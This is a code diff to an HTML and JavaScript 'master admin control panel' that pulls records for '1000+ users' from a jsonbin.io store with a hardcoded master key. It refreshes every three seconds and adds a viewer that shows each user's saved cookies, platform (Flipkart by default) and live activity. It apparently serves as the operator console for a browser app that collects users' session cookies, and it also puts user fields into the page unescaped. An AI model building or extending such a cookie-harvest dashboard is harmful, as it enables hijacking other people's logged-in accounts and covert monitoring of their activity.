@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Master Admin Control Panel - Browser App</title>
+    <title>Master Admin Control Panel - 1000+ Users</title>
     <style>
         :root {
             --bg-color: #0b132b;
@@ -49,7 +49,7 @@
             text-align: center;
         }
         .stat-card h3 { margin: 0 0 5px 0; font-size: 13px; color: var(--text-muted); }
-        .stat-card .value { font-size: 20px; font-weight: bold; color: var(--accent); }
+        .stat-card .value { font-size: 22px; font-weight: bold; color: var(--accent); }
 
         .main-grid {
             display: grid;
@@ -94,10 +94,8 @@
             cursor: pointer;
         }
         button:hover { opacity: 0.9; }
-        .btn-danger {
-            background-color: var(--danger);
-            color: white;
-        }
+        .btn-danger { background-color: var(--danger); color: white; }
+        .btn-view { background-color: var(--success); color: var(--bg-color); margin-right: 5px; }
         pre {
             background-color: #050b18;
             color: var(--success);
@@ -105,15 +103,24 @@
             border-radius: 6px;
             font-size: 11px;
             overflow-x: auto;
-            max-height: 200px;
-            border: 1px solid var(--border);
+            max-height: 220px;
+            border: 1px file solid var(--border);
+        }
+        .profile-badge {
+            background: rgba(76, 201, 240, 0.15);
+            color: var(--accent);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 11px;
+            border: 1px solid var(--accent);
         }
     </style>
 </head>
 <body>
 
     <header>
-        <h1>🛡️ BROWSER APP MASTER CONTROL PANEL</h1>
+        <h1>🛡️ 1000+ USERS BROWSER MASTER CONTROL PANEL</h1>
         <div>
             <span style="color: var(--success); font-weight: bold; margin-right: 15px;">● Cloud Synced</span>
             <button onclick="fetchCloudData()">🔄 Refresh Data</button>
@@ -123,50 +130,52 @@
     <!-- Top Quick Stats -->
     <div class="stats-grid">
         <div class="stat-card">
-            <h3>Active User Session</h3>
-            <div class="value" id="lblUser">Loading...</div>
+            <h3>Total Active Users</h3>
+            <div class="value" id="lblTotalUsers">0</div>
         </div>
         <div class="stat-card">
-            <h3>Target Platform</h3>
-            <div class="value" id="lblPlatform">Loading...</div>
+            <h3>Active Profiles Running</h3>
+            <div class="value" id="lblActiveProfiles">0</div>
         </div>
         <div class="stat-card">
-            <h3>System Status</h3>
-            <div class="value" style="color: var(--success);">Online</div>
+            <h3>System Cloud Status</h3>
+            <div class="value" style="color: var(--success);">Live 1000+ Ready</div>
         </div>
     </div>
 
     <div class="main-grid">
-        <!-- Left Column: Active User & Cookie Management -->
+        <!-- Left Column: All Active Users & Profiles Table -->
         <div>
             <div class="panel-box">
-                <h2>👥 Active Users & Sessions Control</h2>
+                <h2>👥 All Users & Active Profiles Control</h2>
                 <table>
                     <thead>
                         <tr>
                             <th>User Email</th>
-                            <th>Platform</th>
+                            <th>Platform & Profile</th>
+                            <th>Current Activity</th>
                             <th>Actions</th>
                         </tr>
                     </thead>
-                    <tbody id="userTableBody">
+                    <tbody id="usersTableBody">
                         <tr>
-                            <td colspan="3" style="text-align: center; color: var(--text-muted);">Fetching active users...</td>
+                            <td colspan="4" style="text-align: center; color: var(--text-muted);">Loading active users database...</td>
                         </tr>
                     </tbody>
                 </table>
             </div>
 
             <div class="panel-box">
-                <h2>🍪 Active Cookies & Vault Viewer</h2>
-                <pre id="cookieVaultView">No cookies loaded yet...</pre>
+                <h2>🍪 Selected User Cookie File Viewer</h2>
+                <div id="selectedUserMeta" style="font-size: 12px; color: var(--accent); margin-bottom: 8px;">Select a user profile above to inspect cookie file</div>
+                <pre id="cookieVaultView">No profile selected yet...</pre>
             </div>
         </div>
 
-        <!-- Right Column: Real-time Live Logs & Raw Data -->
+        <!-- Right Column: Live Global Feed & Raw Payload -->
         <div>
             <div class="panel-box">
-                <h2>🔥 Real-Time Activity Logs</h2>
+                <h2>🔥 Global Real-Time Live Feed</h2>
                 <pre id="liveLogsView">Waiting for user actions...</pre>
             </div>
 
@@ -189,32 +198,45 @@
                 const result = await response.json();
                 const record = result.record;
                 
-                // Update Top Stats
-                const userEmail = record.user || "No Active User";
-                const platform = record.platform ? record.platform.toUpperCase() : "N/A";
-                
-                document.getElementById("lblUser").innerText = userEmail;
-                document.getElementById("lblPlatform").innerText = platform;
-
-                // Update User Table
-                const tableBody = document.getElementById("userTableBody");
-                if (record.user) {
-                    tableBody.innerHTML = `
-                        <tr>
-                            <td>${userEmail}</td>
-                            <td>${platform}</td>
-                            <td>
-                                <button class="btn-danger" onclick="deleteUserSession()">Delete / Revoke</button>
-                            </td>
-                        </tr>
-                    `;
-                } else {
-                    tableBody.innerHTML = `<tr><td colspan="3" style="text-align: center;">No active session found</td></tr>`;
+                // Support both single user format and multi-user array format
+                let usersList = [];
+                if (record.users && Array.isArray(record.users)) {
+                    usersList = record.users;
+                } else if (record.user) {
+                    // Fallback to single user object converted to list format
+                    usersList = [{
+                        email: record.user,
+                        platform: record.platform || "flipkart",
+                        profileId: record.profileId || 1,
+                        activity: record.live_logs || "Active",
+                        cookies: record.cookies_data || "No cookies found"
+                    }];
                 }
 
-                // Update Logs & Cookie Vault views
+                document.getElementById("lblTotalUsers").innerText = usersList.length;
+                document.getElementById("lblActiveProfiles").innerText = usersList.length;
+
+                const tableBody = document.getElementById("usersTableBody");
+                if (usersList.length > 0) {
+                    tableBody.innerHTML = usersList.map((u, index) => `
+                        <tr>
+                            <td><strong>${u.email}</strong></td>
+                            <td>
+                                <span style="text-transform: uppercase;">${u.platform || 'FLIPKART'}</span><br>
+                                <span class="profile-badge">Profile #${u.profileId || 1}</span>
+                            </td>
+                            <td><small>${u.activity || 'Navigating...'}</small></td>
+                            <td>
+                                <button class="btn-view" onclick='inspectCookie(${JSON.stringify(u)})'>📁 View Cookie</button>
+                                <button class="btn-danger" onclick="deleteUserSession('${u.email}')">Delete</button>
+                            </td>
+                        </tr>
+                    `).join('');
+                } else {
+                    tableBody.innerHTML = `<tr><td colspan="4" style="text-align: center;">No active users found</td></tr>`;
+                }
+
                 document.getElementById("liveLogsView").innerText = record.live_logs || "No logs available.";
-                document.getElementById("cookieVaultView").innerText = record.cookies_data || record.live_logs || "No cookies found in current session.";
                 document.getElementById("rawJsonView").innerText = JSON.stringify(record, null, 4);
 
             } catch (error) {
@@ -222,27 +244,44 @@
             }
         }
 
-        async function deleteUserSession() {
-            if (confirm("Kya aap wakai is user session ko delete/revoke karna chahte hain?")) {
+        function inspectCookie(userObj) {
+            document.getElementById("selectedUserMeta").innerText = `User: ${userObj.email} | Platform: ${(userObj.platform || 'flipkart').toUpperCase()} | Profile #${userObj.profileId || 1}`;
+            document.getElementById("cookieVaultView").innerText = userObj.cookies || "No cookie data saved for this profile.";
+        }
+
+        async function deleteUserSession(email) {
+            if (confirm(`Kya aap wakai user ${email} ka session delete karna chahte hain?`)) {
                 try {
-                    const emptyData = { live_logs: "Session revoked by Admin", user: "", platform: "", cookies_data: "" };
+                    // Fetch latest data to filter out the deleted user
+                    const response = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+                        headers: { "X-Master-Key": masterKey }
+                    });
+                    const result = await response.json();
+                    let record = result.record;
+
+                    if (record.users && Array.isArray(record.users)) {
+                        record.users = record.users.filter(u => u.email !== email);
+                    } else {
+                        record = { live_logs: "User deleted by admin", users: [] };
+                    }
+
                     await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
                         method: "PUT",
                         headers: {
                             "Content-Type": "application/json",
                             "X-Master-Key": masterKey
                         },
-                        body: JSON.stringify(emptyData)
+                        body: JSON.stringify(record)
                     });
-                    alert("User session successfully delete/revoke kar diya gaya hai!");
+                    alert("User successfully delete kar diya gaya hai!");
                     fetchCloudData();
                 } catch (e) {
-                    alert("Error revoking session: " + e.message);
+                    alert("Error deleting user: " + e.message);
                 }
             }
         }
 
-        // Auto-refresh every 3 seconds
+        // Auto-refresh every 3 seconds for 1000+ users real-time monitoring
         setInterval(fetchCloudData, 3000);
         fetchCloudData();
     </script>
